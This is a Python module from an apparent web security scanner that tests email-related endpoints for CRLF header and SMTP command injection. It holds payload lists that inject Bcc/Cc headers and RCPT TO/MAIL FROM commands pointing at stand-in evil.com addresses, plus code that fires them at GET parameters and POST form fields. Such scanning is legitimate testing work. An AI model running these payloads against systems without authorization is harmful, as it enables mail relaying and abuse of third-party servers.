"""
modules/email_header.py
-----------------------
Email Header Injection (SMTP injection) detection.

Tests contact/feedback/email endpoints for:
  - CRLF injection in email fields
  - BCC/CC injection
  - Arbitrary header injection
"""

import re
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines
from core.rate_limiter import acquire
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("email_header")


# ─────────────────────────────────────────
# Endpoints likely to send email
# ─────────────────────────────────────────
EMAIL_HINTS = [
    "contact", "feedback", "subscribe", "newsletter", "invite",
    "share", "send", "email", "report", "support", "help",
    "forgot", "reset", "verify", "confirm", "notify",
]

# Params that commonly feed into email
EMAIL_PARAMS = [
    "email", "mail", "to", "from", "recipient", "sender",
    "cc", "bcc", "subject", "name", "message", "body",
]


# ─────────────────────────────────────────
# Payloads
# ─────────────────────────────────────────
CRLF_PAYLOADS = [
    "%0d%0aBcc:injected@evil.com",
    "\r\nBcc:injected@evil.com",
    "%0aBcc:injected@evil.com",
    "%0d%0aCc:injected@evil.com",
    "%0d%0aX-Injected-Header:yes",
    "%0d%0aContent-Type:text/html",
    "%0d%0a%0d%0aInjected body text",
]

# SMTP command injection attempts
SMTP_PAYLOADS = [
    "%0d%0aDATA",
    "%0d%0aRCPT TO:<attacker@evil.com>",
    "%0d%0aMAIL FROM:<attacker@evil.com>",
]


# ─────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────
def _looks_like_email_endpoint(url: str) -> bool:
    low = url.lower()
    return any(h in low for h in EMAIL_HINTS)


def _find_email_params(url: str) -> List[str]:
    try:
        qs = parse_qs(urlparse(url).query)
        return [p for p in qs if p.lower() in EMAIL_PARAMS]
    except Exception:
        return []


def _inject(url: str, param: str, payload: str) -> Optional[str]:
    try:
        p = urlparse(url)
        qs = parse_qs(p.query)
        if param in qs:
            qs[param] = [payload]
        else:
            qs[param] = [payload]
        return urlunparse((p.scheme, p.netloc, p.path, p.params,
                           urlencode(qs, doseq=True), ""))
    except Exception:
        return None


def _send(url: str, method: str = "POST",
          data: Optional[dict] = None) -> Optional[object]:
    acquire(url)
    return safe_request(
        url, method=method,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=data, timeout=10, allow_redirects=False
    )


def _detect_injection(response) -> Optional[str]:
    """
    Look for signs that CRLF injection succeeded:
      - Server error mentioning 'header' or 'smtp'
      - 500 error on injected vs 200 on clean
    """
    if response is None:
        return None
    text = (response.text or "").lower()
    markers = [
        "invalid header", "header injection", "malformed header",
        "smtp error", "invalid recipient", "invalid address",
        "line too long", "header field too long",
        "message contains invalid",
    ]
    for m in markers:
        if m in text:
            return m
    return None


# ─────────────────────────────────────────
# Tests
# ─────────────────────────────────────────
def test_get_url(url: str) -> List[Dict]:
    findings: List[Dict] = []
    params = _find_email_params(url)
    if not params:
        return findings

    for param in params:
        for payload in CRLF_PAYLOADS[:4]:
            test_url = _inject(url, param, f"test{payload}")
            if not test_url:
                continue
            try:
                r = _send(test_url, method="GET")
            except Exception:
                continue
            marker = _detect_injection(r)
            if marker:
                findings.append({
                    "type": "email_header_injection",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": f"Server error: {marker}",
                    "severity": "high",
                    "confidence": 60,
                })
                break
    return findings


def test_post_email_form(url: str) -> List[Dict]:
    """
    POST to email endpoints with CRLF-injected fields.
    """
    findings: List[Dict] = []

    # Try several field names
    for field in ["email", "to", "from", "subject", "message", "name"]:
        for payload in CRLF_PAYLOADS[:4]:
            data = {
                field: f"test{payload}@evil.com",
                "message": "test",
                "subject": "test",
                "name": "test",
            }
            try:
                r = _send(url, method="POST", data=data)
            except Exception:
                continue
            marker = _detect_injection(r)
            if marker:
                findings.append({
                    "type": "email_header_injection_post",
                    "url": url,
                    "param": field,
                    "payload": payload,
                    "evidence": f"Server error: {marker}",
                    "severity": "high",
                    "confidence": 55,
                })
                return findings  # one is enough per endpoint
    return findings


def test_smtp_command_injection(url: str) -> List[Dict]:
    """
    Attempt SMTP command injection via email fields.
    """
    findings: List[Dict] = []
    for field in ["email", "to"]:
        for payload in SMTP_PAYLOADS:
            data = {
                field: f"test{payload}@evil.com",
                "message": "test",
            }
            try:
                r = _send(url, method="POST", data=data)
            except Exception:
                continue
            if r and r.status_code in (500, 501, 502, 503):
                findings.append({
                    "type": "smtp_command_injection_suspect",
                    "url": url,
                    "param": field,
                    "payload": payload,
                    "evidence": f"Server status {r.status_code} on SMTP payload",
                    "severity": "high",
                    "confidence": 40,
                })
                break
    return findings


# ─────────────────────────────────────────
# Orchestrator
# ─────────────────────────────────────────
def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "email_header", output_root)
    urls = load_urls(domain, output_root)
    if not urls:
        info("No URLs to test")
        return {"count": 0, "findings": []}

    # Candidates
    candidates = [u for u in urls if _looks_like_email_endpoint(u)]
    if not candidates:
        # Fall back to param URL sample
        candidates = [u for u in urls if "?" in u and "=" in u][:15]

    info(f"Testing {len(candidates[:20])} email-related endpoints")
    findings: List[Dict] = []

    for url in candidates[:20]:
        try:
            findings.extend(test_get_url(url))
        except Exception as e:
            log.debug(f"GET email test failed {url}: {e}")

        try:
            findings.extend(test_post_email_form(url))
        except Exception as e:
            log.debug(f"POST email test failed {url}: {e}")

        try:
            findings.extend(test_smtp_command_injection(url))
        except Exception as e:
            log.debug(f"SMTP test failed {url}: {e}")

    # Save
    for f in findings:
        save_finding(domain, "email_header", f["type"], f["severity"],
                     f["url"], param=f.get("param", ""),
                     payload=f.get("payload", ""),
                     evidence=f.get("evidence", ""),
                     confidence=f.get("confidence", 0),
                     scan_id=scan_id, output_root=output_root)

    if findings:
        write_lines(mdir / "email_header_findings.txt",
                    [f"[{f['severity']}] {f['type']} → {f['url']}"
                     for f in findings])
        ok(f"Found {len(findings)} email-header finding(s)")
    else:
        info("No email-header issues detected")

    return {"count": len(findings), "findings": findings}


# ─────────────────────────────────────────
# CLI
# ─────────────────────────────────────────
if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="Email header injection scanner")
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "email_header", run, args.output)